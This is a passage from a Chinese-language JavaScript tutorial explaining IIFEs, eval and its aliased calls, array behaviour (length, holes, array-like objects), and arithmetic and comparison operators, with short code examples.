      true && function(){ /* code */ }();
      0, function(){ /* code */ }();

   甚至像下面这样写，也是可以的。

   .. code:: javascript

      !function () { /* code */ }();
      ~function () { /* code */ }();
      -function () { /* code */ }();
      +function () { /* code */ }();

   通常情况下，只对匿名函数使用这种“立即执行的函数表达式”。它的目的有两个：一是不必为函数命名，避免了污染全局变量；二是 IIFE 内部形成了一个单独的作用域，可以封装一些外部无法读取的私有变量。

   .. code:: javascript

      // 写法一
      var tmp = newData;
      processData(tmp);
      storeData(tmp);
   
      // 写法二
      (function () {
        var tmp = newData;
        processData(tmp);
        storeData(tmp);
      }());

   上面代码中，写法二比写法一更好，因为完全避免了污染全局变量。

eval 命令
---------


基本用法
~~~~~~~

    ``eval`` 命令接受一个字符串作为参数，并将这个字符串当作语句执行。

   .. code:: javascript

      eval('var a = 1;');
      a // 1

   上面代码将字符串当作语句运行，生成了变量 ``a`` 。

   如果参数字符串无法当作语句运行，那么就会报错。

   .. code:: javascript

      eval('3x') // Uncaught SyntaxError: Invalid or unexpected token

   放在 ``eval`` 中的字符串，应该有独自存在的意义，不能用来与 ``eval`` 以外的命令配合使用。举例来说，下面的代码将会报错。

   .. code:: javascript

      eval('return;'); // Uncaught SyntaxError: Illegal return statement

   上面代码会报错，因为 ``return`` 不能单独使用，必须在函数中使用。

   如果 ``eval`` 的参数不是字符串，那么会原样返回。

   .. code:: javascript

      eval(123) // 123

    ``eval`` 没有自己的作用域，都在当前作用域内执行，因此可能会修改当前作用域的变量的值，造成安全问题。

   .. code:: javascript

      var a = 1;
      eval('a = 2');
   
      a // 2

   上面代码中， ``eval`` 命令修改了外部变量 ``a`` 的值。由于这个原因， ``eval`` 有安全风险。

   为了防止这种风险，JavaScript 规定，如果使用严格模式， ``eval`` 内部声明的变量，不会影响到外部作用域。

   .. code:: javascript

      (function f() {
        'use strict';
        eval('var foo = 123');
        console.log(foo);  // ReferenceError: foo is not defined
      })()

   上面代码中，函数 ``f`` 内部是严格模式，这时 ``eval`` 内部声明的 ``foo`` 变量，就不会影响到外部。

   不过，即使在严格模式下， ``eval`` 依然可以读写当前作用域的变量。

   .. code:: javascript

      (function f() {
        'use strict';
        var foo = 1;
        eval('foo = 2');
        console.log(foo);  // 2
      })()

   上面代码中，严格模式下， ``eval`` 内部还是改写了外部变量，可见安全风险依然存在。

   总之， ``eval`` 的本质是在当前作用域之中，注入代码。由于安全风险和不利于 JavaScript 引擎优化执行速度，一般不推荐使用。通常情况下， ``eval`` 最常见的场合是解析 JSON 数据的字符串，不过正确的做法应该是使用原生的 ``JSON.parse`` 方法。

eval 的别名调用
~~~~~~~~~~~~~

   前面说过 ``eval`` 不利于引擎优化执行速度。更麻烦的是，还有下面这种情况，引擎在静态代码分析的阶段，根本无法分辨执行的是 ``eval`` 。

   .. code:: javascript

      var m = eval;
      m('var x = 1');
      x // 1

   上面代码中，变量 ``m`` 是 ``eval`` 的别名。静态代码分析阶段，引擎分辨不出 ``m('var x = 1')`` 执行的是 ``eval`` 命令。

   为了保证 ``eval`` 的别名不影响代码优化，JavaScript 的标准规定，凡是使用别名执行 ``eval`` ， ``eval`` 内部一律是全局作用域。

   .. code:: javascript

      var a = 1;
   
      function f() {
        var a = 2;
        var e = eval;
        e('console.log(a)');
      }
   
      f() // 1

   上面代码中， ``eval`` 是别名调用，所以即使它是在函数中，它的作用域还是全局作用域，因此输出的 ``a`` 为全局变量。这样的话，引擎就能确认 ``e()`` 不会对当前的函数作用域产生影响，优化的时候就可以把这一行排除掉。

    ``eval`` 的别名调用的形式五花八门，只要不是直接调用，都属于别名调用，因为引擎只能分辨 ``eval()`` 这一种形式是直接调用。

   .. code:: javascript

      eval.call(null, '...')
      window.eval('...')
      (1, eval)('...')
      (eval, eval)('...')

   上面这些形式都是 ``eval`` 的别名调用，作用域都是全局作用域。

参考链接
-------

   - Ben Alman, [Immediately-Invoked Function Expression (IIFE)](http://benalman.com/news/2010/11/immediately-invoked-function-expression/)
   - Mark Daggett, [Functions Explained](https://web.archive.org/web/20160911170816/http://markdaggett.com/blog/2013/02/15/functions-explained/)
   - Juriy Zaytsev, [Named function expressions demystified](http://kangax.github.io/nfe/)
   - Marco Rogers polotek, [What is the arguments object?](http://docs.nodejitsu.com/articles/javascript-conventions/what-is-the-arguments-object)
   - Juriy Zaytsev, [Global eval. What are the options?](http://perfectionkills.com/global-eval-what-are-the-options/)
   - Axel Rauschmayer, [Evaluating JavaScript code via eval() and new Function()](http://www.2ality.com/2014/01/eval.html)

/🟠 数组
========

定义
---

   数组（array）是按次序排列的一组值。每个值的位置都有编号（从0开始），整个数组用方括号表示。

   .. code:: javascript

      var arr = ['a', 'b', 'c'];

   上面代码中的 ``a`` 、 ``b`` 、 ``c`` 就构成一个数组，两端的方括号是数组的标志。 ``a`` 是0号位置， ``b`` 是1号位置， ``c`` 是2号位置。

   除了在定义时赋值，数组也可以先定义后赋值。

   .. code:: javascript

      var arr = [];
   
      arr[0] = 'a';
      arr[1] = 'b';
      arr[2] = 'c';

   任何类型的数据，都可以放入数组。

   .. code:: javascript

      var arr = [
        {a: 1},
        [1, 2, 3],
        function() {return true;}
      ];
   
      arr[0] // Object {a: 1}
      arr[1] // [1, 2, 3]
      arr[2] // function (){return true;}

   上面数组 ``arr`` 的3个成员依次是对象、数组、函数。

   如果数组的元素还是数组，就形成了多维数组。

   .. code:: javascript

      var a = [[1, 2], [3, 4]];
      a[0][1] // 2
      a[1][1] // 4

数组的本质
--------

   本质上，数组属于一种特殊的对象。 ``typeof`` 运算符会返回数组的类型是 ``object`` 。

   .. code:: javascript

      typeof [1, 2, 3] // "object"

   上面代码表明， ``typeof`` 运算符认为数组的类型就是对象。

   数组的特殊性体现在，它的键名是按次序排列的一组整数（0，1，2...）。

   .. code:: javascript

      var arr = ['a', 'b', 'c'];
   
      Object.keys(arr)
      // ["0", "1", "2"]

   上面代码中， ``Object.keys`` 方法返回数组的所有键名。可以看到数组的键名就是整数0、1、2。

   由于数组成员的键名是固定的（默认总是0、1、2...），因此数组不用为每个元素指定键名，而对象的每个成员都必须指定键名。JavaScript 语言规定，对象的键名一律为字符串，所以，数组的键名其实也是字符串。之所以可以用数值读取，是因为非字符串的键名会被转为字符串。

   .. code:: javascript

      var arr = ['a', 'b', 'c'];
   
      arr['0'] // 'a'
      arr[0] // 'a'

   上面代码分别用数值和字符串作为键名，结果都能读取数组。原因是数值键名被自动转为了字符串。

   注意，这点在赋值时也成立。一个值总是先转成字符串，再作为键名进行赋值。

   .. code:: javascript

      var a = [];
   
      a[1.00] = 6;
      a[1] // 6

   上面代码中，由于 ``1.00`` 转成字符串是 ``1`` ，所以通过数字键 ``1`` 可以读取值。

   上一章说过，对象有两种读取成员的方法：点结构（ ``object.key`` ）和方括号结构（ ``object[key]`` ）。但是，对于数值的键名，不能使用点结构。

   .. code:: javascript

      var arr = [1, 2, 3];
      arr.0 // SyntaxError

   上面代码中， ``arr.0`` 的写法不合法，因为单独的数值不能作为标识符（identifier）。所以，数组成员只能用方括号 ``arr[0]`` 表示（方括号是运算符，可以接受数值）。

length 属性
----------

   数组的 ``length`` 属性，返回数组的成员数量。

   .. code:: javascript

      ['a', 'b', 'c'].length // 3

   JavaScript 使用一个32位整数，保存数组的元素个数。这意味着，数组成员最多只有 4294967295 个（2<sup>32</sup> - 1）个，也就是说 ``length`` 属性的最大值就是 4294967295。

   只要是数组，就一定有 ``length`` 属性。该属性是一个动态的值，等于键名中的最大整数加上 ``1`` 。

   .. code:: javascript

      var arr = ['a', 'b'];
      arr.length // 2
   
      arr[2] = 'c';
      arr.length // 3
   
      arr[9] = 'd';
      arr.length // 10
   
      arr[1000] = 'e';
      arr.length // 1001

   上面代码表示，数组的数字键不需要连续， ``length`` 属性的值总是比最大的那个整数键大 ``1`` 。另外，这也表明数组是一种动态的数据结构，可以随时增减数组的成员。

    ``length`` 属性是可写的。如果人为设置一个小于当前成员个数的值，该数组的成员数量会自动减少到 ``length`` 设置的值。

   .. code:: javascript

      var arr = [ 'a', 'b', 'c' ];
      arr.length // 3
   
      arr.length = 2;
      arr // ["a", "b"]

   上面代码表示，当数组的 ``length`` 属性设为2（即最大的整数键只能是1）那么整数键2（值为 ``c`` ）就已经不在数组中了，被自动删除了。

   清空数组的一个有效方法，就是将 ``length`` 属性设为0。

   .. code:: javascript

      var arr = [ 'a', 'b', 'c' ];
   
      arr.length = 0;
      arr // []

   如果人为设置 ``length`` 大于当前元素个数，则数组的成员数量会增加到这个值，新增的位置都是空位。

   .. code:: javascript

      var a = ['a'];
   
      a.length = 3;
      a[1] // undefined

   上面代码表示，当 ``length`` 属性设为大于数组个数时，读取新增的位置都会返回 ``undefined`` 。

   如果人为设置 ``length`` 为不合法的值，JavaScript 会报错。

   .. code:: javascript

      // 设置负值
      [].length = -1
      // RangeError: Invalid array length
   
      // 数组元素个数大于等于2的32次方
      [].length = Math.pow(2, 32)
      // RangeError: Invalid array length
   
      // 设置字符串
      [].length = 'abc'
      // RangeError: Invalid array length

   值得注意的是，由于数组本质上是一种对象，所以可以为数组添加属性，但是这不影响 ``length`` 属性的值。

   .. code:: javascript

      var a = [];
   
      a['p'] = 'abc';
      a.length // 0
   
      a[2.1] = 'abc';
      a.length // 0

   上面代码将数组的键分别设为字符串和小数，结果都不影响 ``length`` 属性。因为， ``length`` 属性的值就是等于最大的数字键加1，而这个数组没有整数键，所以 ``length`` 属性保持为 ``0`` 。

   如果数组的键名是添加超出范围的数值，该键名会自动转为字符串。

   .. code:: javascript

      var arr = [];
      arr[-1] = 'a';
      arr[Math.pow(2, 32)] = 'b';
   
      arr.length // 0
      arr[-1] // "a"
      arr[4294967296] // "b"

   上面代码中，我们为数组 ``arr`` 添加了两个不合法的数字键，结果 ``length`` 属性没有发生变化。这些数字键都变成了字符串键名。最后两行之所以会取到值，是因为取键值时，数字键名会默认转为字符串。

in 运算符
--------

   检查某个键名是否存在的运算符 ``in`` ，适用于对象，也适用于数组。

   .. code:: javascript

      var arr = [ 'a', 'b', 'c' ];
      2 in arr  // true
      '2' in arr // true
      4 in arr // false

   上面代码表明，数组存在键名为 ``2`` 的键。由于键名都是字符串，所以数值 ``2`` 会自动转成字符串。

   注意，如果数组的某个位置是空位， ``in`` 运算符返回 ``false`` 。

   .. code:: javascript

      var arr = [];
      arr[100] = 'a';
   
      100 in arr // true
      1 in arr // false

   上面代码中，数组 ``arr`` 只有一个成员 ``arr[100]`` ，其他位置的键名都会返回 ``false`` 。

for...in 循环和数组的遍历
----------------------

    ``for...in`` 循环不仅可以遍历对象，也可以遍历数组，毕竟数组只是一种特殊对象。

   .. code:: javascript

      var a = [1, 2, 3];
   
      for (var i in a) {
        console.log(a[i]);
      }
      // 1
      // 2
      // 3

   但是， ``for...in`` 不仅会遍历数组所有的数字键，还会遍历非数字键。

   .. code:: javascript

      var a = [1, 2, 3];
      a.foo = true;
   
      for (var key in a) {
        console.log(key);
      }
      // 0
      // 1
      // 2
      // foo

   上面代码在遍历数组时，也遍历到了非整数键 ``foo`` 。所以，不推荐使用 ``for...in`` 遍历数组。

   数组的遍历可以考虑使用 ``for`` 循环或 ``while`` 循环。

   .. code:: javascript

      var a = [1, 2, 3];
   
      // for循环
      for(var i = 0; i < a.length; i++) {
        console.log(a[i]);
      }
   
      // while循环
      var i = 0;
      while (i < a.length) {
        console.log(a[i]);
        i++;
      }
   
      var l = a.length;
      while (l--) {
        console.log(a[l]);
      }

   上面代码是三种遍历数组的写法。最后一种写法是逆向遍历，即从最后一个元素向第一个元素遍历。

   数组的 ``forEach`` 方法，也可以用来遍历数组，详见《标准库》的 Array 对象一章。

   .. code:: javascript

      var colors = ['red', 'green', 'blue'];
      colors.forEach(function (color) {
        console.log(color);
      });
      // red
      // green
      // blue

数组的空位
--------

   当数组的某个位置是空元素，即两个逗号之间没有任何值，我们称该数组存在空位（hole）。

   .. code:: javascript

      var a = [1, , 1];
      a.length // 3

   上面代码表明，数组的空位不影响 ``length`` 属性。虽然这个位置没有值，引擎依然认为这个位置是有效的。

   需要注意的是，如果最后一个元素后面有逗号，并不会产生空位。也就是说，有没有这个逗号，结果都是一样的。

   .. code:: javascript

      var a = [1, 2, 3,];
   
      a.length // 3
      a // [1, 2, 3]

   上面代码中，数组最后一个成员后面有一个逗号，这不影响 ``length`` 属性的值，与没有这个逗号时效果一样。

   数组的空位是可以读取的，返回 ``undefined`` 。

   .. code:: javascript

      var a = [, , ,];
      a[1] // undefined

   使用 ``delete`` 命令删除一个数组成员，会形成空位，并且不会影响 ``length`` 属性。

   .. code:: javascript

      var a = [1, 2, 3];
      delete a[1];
   
      a[1] // undefined
      a.length // 3

   上面代码用 ``delete`` 命令删除了数组的第二个元素，这个位置就形成了空位，但是对 ``length`` 属性没有影响。也就是说， ``length`` 属性不过滤空位。所以，使用 ``length`` 属性进行数组遍历，一定要非常小心。

   数组的某个位置是空位，与某个位置是 ``undefined`` ，是不一样的。如果是空位，使用数组的 ``forEach`` 方法、 ``for...in`` 结构、以及 ``Object.keys`` 方法进行遍历，空位都会被跳过。

   .. code:: javascript

      var a = [, , ,];
   
      a.forEach(function (x, i) {
        console.log(i + '. ' + x);
      })
      // 不产生任何输出
   
      for (var i in a) {
        console.log(i);
      }
      // 不产生任何输出
   
      Object.keys(a)
      // []

   如果某个位置是 ``undefined`` ，遍历的时候就不会被跳过。

   .. code:: javascript

      var a = [undefined, undefined, undefined];
   
      a.forEach(function (x, i) {
        console.log(i + '. ' + x);
      });
      // 0. undefined
      // 1. undefined
      // 2. undefined
   
      for (var i in a) {
        console.log(i);
      }
      // 0
      // 1
      // 2
   
      Object.keys(a)
      // ['0', '1', '2']

   这就是说，空位就是数组没有这个元素，所以不会被遍历到，而 ``undefined`` 则表示数组有这个元素，值是 ``undefined`` ，所以遍历不会跳过。

类似数组的对象
------------

   如果一个对象的所有键名都是正整数或零，并且有 ``length`` 属性，那么这个对象就很像数组，语法上称为“类似数组的对象”（array-like object）。

   .. code:: javascript

      var obj = {
        0: 'a',
        1: 'b',
        2: 'c',
        length: 3
      };
   
      obj[0] // 'a'
      obj[1] // 'b'
      obj.length // 3
      obj.push('d') // TypeError: obj.push is not a function

   上面代码中，对象 ``obj`` 就是一个类似数组的对象。但是，“类似数组的对象”并不是数组，因为它们不具备数组特有的方法。对象 ``obj`` 没有数组的 ``push`` 方法，使用该方法就会报错。

   “类似数组的对象”的根本特征，就是具有 ``length`` 属性。只要有 ``length`` 属性，就可以认为这个对象类似于数组。但是有一个问题，这种 ``length`` 属性不是动态值，不会随着成员的变化而变化。

   .. code:: javascript

      var obj = {
        length: 0
      };
      obj[3] = 'd';
      obj.length // 0

   上面代码为对象 ``obj`` 添加了一个数字键，但是 ``length`` 属性没变。这就说明了 ``obj`` 不是数组。

   典型的“类似数组的对象”是函数的 ``arguments`` 对象，以及大多数 DOM 元素集，还有字符串。

   .. code:: javascript

      // arguments对象
      function args() { return arguments }
      var arrayLike = args('a', 'b');
   
      arrayLike[0] // 'a'
      arrayLike.length // 2
      arrayLike instanceof Array // false
   
      // DOM元素集
      var elts = document.getElementsByTagName('h3');
      elts.length // 3
      elts instanceof Array // false
   
      // 字符串
      'abc'[1] // 'b'
      'abc'.length // 3
      'abc' instanceof Array // false

   上面代码包含三个例子，它们都不是数组（ ``instanceof`` 运算符返回 ``false`` ），但是看上去都非常像数组。

   数组的 ``slice`` 方法可以将“类似数组的对象”变成真正的数组。

   .. code:: javascript

      var arr = Array.prototype.slice.call(arrayLike);

   除了转为真正的数组，“类似数组的对象”还有一个办法可以使用数组的方法，就是通过 ``call()`` 把数组的方法放到对象上面。

   .. code:: javascript

      function print(value, index) {
        console.log(index + ' : ' + value);
      }
   
      Array.prototype.forEach.call(arrayLike, print);

   上面代码中， ``arrayLike`` 代表一个类似数组的对象，本来是不可以使用数组的 ``forEach()`` 方法的，但是通过 ``call()`` ，可以把 ``forEach()`` 嫁接到 ``arrayLike`` 上面调用。

   下面的例子就是通过这种方法，在 ``arguments`` 对象上面调用 ``forEach`` 方法。

   .. code:: javascript

      // forEach 方法
      function logArgs() {
        Array.prototype.forEach.call(arguments, function (elem, i) {
          console.log(i + '. ' + elem);
        });
      }
   
      // 等同于 for 循环
      function logArgs() {
        for (var i = 0; i < arguments.length; i++) {
          console.log(i + '. ' + arguments[i]);
        }
      }

   字符串也是类似数组的对象，所以也可以用 ``Array.prototype.forEach.call`` 遍历。

   .. code:: javascript

      Array.prototype.forEach.call('abc', function (chr) {
        console.log(chr);
      });
      // a
      // b
      // c

   注意，这种方法比直接使用数组原生的 ``forEach`` 要慢，所以最好还是先将“类似数组的对象”转为真正的数组，然后再直接调用数组的 ``forEach`` 方法。

   .. code:: javascript

      var arr = Array.prototype.slice.call('abc');
      arr.forEach(function (chr) {
        console.log(chr);
      });
      // a
      // b
      // c

参考链接
-------

   - Axel Rauschmayer, [Arrays in JavaScript](http://www.2ality.com/2012/12/arrays.html)
   - Axel Rauschmayer, [JavaScript: sparse arrays vs. dense arrays](http://www.2ality.com/2012/06/dense-arrays.html)
   - Felix Bohm, [What They Didn’t Tell You About ES5′s Array Extras](http://net.tutsplus.com/tutorials/javascript-ajax/what-they-didnt-tell-you-about-es5s-array-extras/)
   - Juriy Zaytsev, [How ECMAScript 5 still does not allow to subclass an array](http://perfectionkills.com/how-ecmascript-5-still-does-not-allow-to-subclass-an-array/)


/🟡3. 运算符
================================================================================

/🟠 算术运算符
=============

   运算符是处理数据的基本方法，用来从现有的值得到新的值。JavaScript 提供了多种运算符，覆盖了所有主要的运算。

概述
---

   JavaScript 共提供10个算术运算符，用来完成基本的算术运算。

   - **加法运算符**： ``x + y`` 
   - **减法运算符**：  ``x - y`` 
   - **乘法运算符**：  ``x * y`` 
   - **除法运算符**： ``x / y`` 
   - **指数运算符**： ``x ** y`` 
   - **余数运算符**： ``x % y`` 
   - **自增运算符**： ``++x``  或者  ``x++`` 
   - **自减运算符**： ``--x``  或者  ``x--`` 
   - **数值运算符**：  ``+x`` 
   - **负数值运算符**： ``-x`` 

   减法、乘法、除法运算法比较单纯，就是执行相应的数学运算。下面介绍其他几个算术运算符，重点是加法运算符。

加法运算符
--------


基本规则
~~~~~~~

   加法运算符（ ``+`` ）是最常见的运算符，用来求两个数值的和。

   .. code:: javascript

      1 + 1 // 2

   JavaScript 允许非数值的相加。

   .. code:: javascript

      true + true // 2
      1 + true // 2

   上面代码中，第一行是两个布尔值相加，第二行是数值与布尔值相加。这两种情况，布尔值都会自动转成数值，然后再相加。

   比较特殊的是，如果是两个字符串相加，这时加法运算符会变成连接运算符，返回一个新的字符串，将两个原字符串连接在一起。

   .. code:: javascript

      'a' + 'bc' // "abc"

   如果一个运算子是字符串，另一个运算子是非字符串，这时非字符串会转成字符串，再连接在一起。

   .. code:: javascript

      1 + 'a' // "1a"
      false + 'a' // "falsea"

   加法运算符是在运行时决定，到底是执行相加，还是执行连接。也就是说，运算子的不同，导致了不同的语法行为，这种现象称为“重载”（overload）。由于加法运算符存在重载，可能执行两种运算，使用的时候必须很小心。

   .. code:: javascript

      '3' + 4 + 5 // "345"
      3 + 4 + '5' // "75"

   上面代码中，由于从左到右的运算次序，字符串的位置不同会导致不同的结果。

   除了加法运算符，其他算术运算符（比如减法、除法和乘法）都不会发生重载。它们的规则是：所有运算子一律转为数值，再进行相应的数学运算。

   .. code:: javascript

      1 - '2' // -1
      1 * '2' // 2
      1 / '2' // 0.5

   上面代码中，减法、除法和乘法运算符，都是将字符串自动转为数值，然后再运算。

对象的相加
~~~~~~~~

   如果运算子是对象，必须先转成原始类型的值，然后再相加。

   .. code:: javascript

      var obj = { p: 1 };
      obj + 2 // "[object Object]2"

   上面代码中，对象 ``obj`` 转成原始类型的值是 ``[object Object]`` ，再加 ``2`` 就得到了上面的结果。

   对象转成原始类型的值，规则如下。

   首先，自动调用对象的 ``valueOf`` 方法。

   .. code:: javascript

      var obj = { p: 1 };
      obj.valueOf() // { p: 1 }

   一般来说，对象的 ``valueOf`` 方法总是返回对象自身，这时再自动调用对象的 ``toString`` 方法，将其转为字符串。

   .. code:: javascript

      var obj = { p: 1 };
      obj.valueOf().toString() // "[object Object]"

   对象的 ``toString`` 方法默认返回 ``[object Object]`` ，所以就得到了最前面那个例子的结果。

   知道了这个规则以后，就可以自己定义 ``valueOf`` 方法或 ``toString`` 方法，得到想要的结果。

   .. code:: javascript

      var obj = {
        valueOf: function () {
          return 1;
        }
      };
   
      obj + 2 // 3

   上面代码中，我们定义 ``obj`` 对象的 ``valueOf`` 方法返回 ``1`` ，于是 ``obj + 2`` 就得到了 ``3`` 。这个例子中，由于 ``valueOf`` 方法直接返回一个原始类型的值，所以不再调用 ``toString`` 方法。

   下面是自定义 ``toString`` 方法的例子。

   .. code:: javascript

      var obj = {
        toString: function () {
          return 'hello';
        }
      };
   
      obj + 2 // "hello2"

   上面代码中，对象 ``obj`` 的 ``toString`` 方法返回字符串 ``hello`` 。前面说过，只要有一个运算子是字符串，加法运算符就变成连接运算符，返回连接后的字符串。

   这里有一个特例，如果运算子是一个 ``Date`` 对象的实例，那么会优先执行 ``toString`` 方法。

   .. code:: javascript

      var obj = new Date();
      obj.valueOf = function () { return 1 };
      obj.toString = function () { return 'hello' };
   
      obj + 2 // "hello2"

   上面代码中，对象 ``obj`` 是一个 ``Date`` 对象的实例，并且自定义了 ``valueOf`` 方法和 ``toString`` 方法，结果 ``toString`` 方法优先执行。

余数运算符
--------

   余数运算符（ ``%`` ）返回前一个运算子被后一个运算子除，所得的余数。

   .. code:: javascript

      12 % 5 // 2

   需要注意的是，运算结果的正负号由第一个运算子的正负号决定。

   .. code:: javascript

      -1 % 2 // -1
      1 % -2 // 1

   所以，为了得到负数的正确余数值，可以先使用绝对值函数。

   .. code:: javascript

      // 错误的写法
      function isOdd(n) {
        return n % 2 === 1;
      }
      isOdd(-5) // false
      isOdd(-4) // false
   
      // 正确的写法
      function isOdd(n) {
        return Math.abs(n % 2) === 1;
      }
      isOdd(-5) // true
      isOdd(-4) // false

   余数运算符还可以用于浮点数的运算。但是，由于浮点数不是精确的值，无法得到完全准确的结果。

   .. code:: javascript

      6.5 % 2.1
      // 0.19999999999999973

自增和自减运算符
-------------

   自增和自减运算符，是一元运算符，只需要一个运算子。它们的作用是将运算子首先转为数值，然后加上1或者减去1。它们会修改原始变量。

   .. code:: javascript

      var x = 1;
      ++x // 2
      x // 2
   
      --x // 1
      x // 1

   上面代码的变量 ``x`` 自增后，返回 ``2`` ，再进行自减，返回 ``1`` 。这两种情况都会使得，原始变量 ``x`` 的值发生改变。

   运算之后，变量的值发生变化，这种效应叫做运算的副作用（side effect）。自增和自减运算符是仅有的两个具有副作用的运算符，其他运算符都不会改变变量的值。

   自增和自减运算符有一个需要注意的地方，就是放在变量之后，会先返回变量操作前的值，再进行自增/自减操作；放在变量之前，会先进行自增/自减操作，再返回变量操作后的值。

   .. code:: javascript

      var x = 1;
      var y = 1;
   
      x++ // 1
      ++y // 2

   上面代码中， ``x`` 是先返回当前值，然后自增，所以得到 ``1`` ； ``y`` 是先自增，然后返回新的值，所以得到 ``2`` 。

数值运算符，负数值运算符
--------------------

   数值运算符（ ``+`` ）同样使用加号，但它是一元运算符（只需要一个操作数），而加法运算符是二元运算符（需要两个操作数）。

   数值运算符的作用在于可以将任何值转为数值（与 ``Number`` 函数的作用相同）。

   .. code:: javascript

      +true // 1
      +[] // 0
      +{} // NaN

   上面代码表示，非数值经过数值运算符以后，都变成了数值（最后一行 ``NaN`` 也是数值）。具体的类型转换规则，参见《数据类型转换》一章。

   负数值运算符（ ``-`` ），也同样具有将一个值转为数值的功能，只不过得到的值正负相反。连用两个负数值运算符，等同于数值运算符。

   .. code:: javascript

      var x = 1;
      -x // -1
      -(-x) // 1

   上面代码最后一行的圆括号不可少，否则会变成自减运算符。

   数值运算符号和负数值运算符，都会返回一个新的值，而不会改变原始变量的值。

指数运算符
--------

   指数运算符（ ``**`` ）完成指数运算，前一个运算子是底数，后一个运算子是指数。

   .. code:: javascript

      2 ** 4 // 16

   注意，指数运算符是右结合，而不是左结合。即多个指数运算符连用时，先进行最右边的计算。

   .. code:: javascript

      // 相当于 2 ** (3 ** 2)
      2 ** 3 ** 2
      // 512

   上面代码中，由于指数运算符是右结合，所以先计算第二个指数运算符，而不是第一个。

赋值运算符
--------

   赋值运算符（Assignment Operators）用于给变量赋值。

   最常见的赋值运算符，当然就是等号（ ``=`` ）。

   .. code:: javascript

      // 将 1 赋值给变量 x
      var x = 1;
   
      // 将变量 y 的值赋值给变量 x
      var x = y;

   赋值运算符还可以与其他运算符结合，形成变体。下面是与算术运算符的结合。

   .. code:: javascript

      // 等同于 x = x + y
      x += y
   
      // 等同于 x = x - y
      x -= y
   
      // 等同于 x = x * y
      x *= y
   
      // 等同于 x = x / y
      x /= y
   
      // 等同于 x = x % y
      x %= y
   
      // 等同于 x = x ** y
      x **= y

   下面是与位运算符的结合（关于位运算符，请见后文的介绍）。

   .. code:: javascript

      // 等同于 x = x >> y
      x >>= y
   
      // 等同于 x = x << y
      x <<= y
   
      // 等同于 x = x >>> y
      x >>>= y
   
      // 等同于 x = x & y
      x &= y
   
      // 等同于 x = x | y
      x |= y
   
      // 等同于 x = x ^ y
      x ^= y

   这些复合的赋值运算符，都是先进行指定运算，然后将得到值返回给左边的变量。

/🟠 比较运算符
=============

概述
---

   比较运算符用于比较两个值的大小，然后返回一个布尔值，表示是否满足指定的条件。

   .. code:: javascript

      2 > 1 // true

   上面代码比较 ``2`` 是否大于 ``1`` ，返回 ``true`` 。

   > 注意，比较运算符可以比较各种类型的值，不仅仅是数值。

   JavaScript 一共提供了8个比较运算符。

   -  ``>``  大于运算符
   -  ``<``  小于运算符
   -  ``<=``  小于或等于运算符
   -  ``>=``  大于或等于运算符
   -  ``==``  相等运算符
   -  ``===``  严格相等运算符
   -  ``!=``  不相等运算符
   -  ``!==``  严格不相等运算符

   这八个比较运算符分成两类：相等比较和非相等比较。两者的规则是不一样的，对于非相等的比较，算法是先看两个运算子是否都是字符串，如果是的，就按照字典顺序比较（实际上是比较 Unicode 码点）；否则，将两个运算子都转成数值，再比较数值的大小。

非相等运算符：字符串的比较
---------------------

   字符串按照字典顺序进行比较。

   .. code:: javascript

      'cat' > 'dog' // false
      'cat' > 'catalog' // false

   JavaScript 引擎内部首先比较首字符的 Unicode 码点。如果相等，再比较第二个字符的 Unicode 码点，以此类推。

   .. code:: javascript

      'cat' > 'Cat' // true'

   上面代码中，小写的 ``c`` 的 Unicode 码点（ ``99`` ）大于大写的 ``C`` 的 Unicode 码点（ ``67`` ），所以返回 ``true`` 。

   由于所有字符都有 Unicode 码点，因此汉字也可以比较。

   .. code:: javascript

      '大' > '小' // false

   上面代码中，“大”的 Unicode 码点是22823，“小”是23567，因此返回 ``false`` 。

非相等运算符：非字符串的比较
-----------------------

   如果两个运算子之中，至少有一个不是字符串，需要分成以下两种情况。

   **（1）原始类型值**

   如果两个运算子都是原始类型的值，则是先转成数值再比较。

   .. code:: javascript

      5 > '4' // true
      // 等同于 5 > Number('4')
      // 即 5 > 4
   
      true > false // true
      // 等同于 Number(true) > Number(false)
      // 即 1 > 0
   
      2 > true // true
      // 等同于 2 > Number(true)
      // 即 2 > 1

   上面代码中，字符串和布尔值都会先转成数值，再进行比较。

   这里需要注意与 ``NaN`` 的比较。任何值（包括 ``NaN`` 本身）与 ``NaN`` 使用非相等运算符进行比较，返回的都是 ``false`` 。

   .. code:: javascript

      1 > NaN // false
      1 <= NaN // false
      '1' > NaN // false
      '1' <= NaN // false
      NaN > NaN // false
      NaN <= NaN // false

   **（2）对象**

   如果运算子是对象，会转为原始类型的值，再进行比较。

   对象转换成原始类型的值，算法是先调用 ``valueOf`` 方法；如果返回的还是对象，再接着调用 ``toString`` 方法，详细解释参见《数据类型的转换》一章。

   .. code:: javascript

      var x = [2];
      x > '11' // true
      // 等同于 [2].valueOf().toString() > '11'
      // 即 '2' > '11'
   
      x.valueOf = function () { return '1' };
      x > '11' // false
      // 等同于 (function () { return '1' })() > '11'
      // 即 '1' > '11'

   两个对象之间的比较也是如此。

   .. code:: javascript

      [2] > [1] // true
      // 等同于 [2].valueOf().toString() > [1].valueOf().toString()
      // 即 '2' > '1'
   
      [2] > [11] // true
      // 等同于 [2].valueOf().toString() > [11].valueOf().toString()
      // 即 '2' > '11'
   
      ({ x: 2 }) >= ({ x: 1 }) // true
      // 等同于 ({ x: 2 }).valueOf().toString() >= ({ x: 1 }).valueOf().toString()
      // 即 '[object Object]' >= '[object Object]'

严格相等运算符
------------

   JavaScript 提供两种相等运算符： ``==`` 和 ``===`` 。

   简单说，它们的区别是相等运算符（ ``==`` ）比较两个值是否相等，严格相等运算符（ ``===`` ）比较它们是否为“同一个值”。如果两个值不是同一类型，严格相等运算符（ ``===`` ）直接返回 ``false`` ，而相等运算符（ ``==`` ）会将它们转换成同一个类型，再用严格相等运算符进行比较。

   本节介绍严格相等运算符的算法。

   **（1）不同类型的值**

   如果两个值的类型不同，直接返回 ``false`` 。

   .. code:: javascript

      1 === "1" // false
      true === "true" // false

   上面代码比较数值的 ``1`` 与字符串的“1”、布尔值的 ``true`` 与字符串 ``"true"`` ，因为类型不同，结果都是 ``false`` 。

   **（2）同一类的原始类型值**

   同一类型的原始类型的值（数值、字符串、布尔值）比较时，值相同就返回 ``true`` ，值不同就返回 ``false`` 。

   .. code:: javascript

      1 === 0x1 // true

   上面代码比较十进制的 ``1`` 与十六进制的 ``1`` ，因为类型和值都相同，返回 ``true`` 。

   需要注意的是， ``NaN`` 与任何值都不相等（包括自身）。另外，正 ``0`` 等于负 ``0`` 。

   .. code:: javascript

      NaN === NaN  // false
      +0 === -0 // true

   **（3）复合类型值**

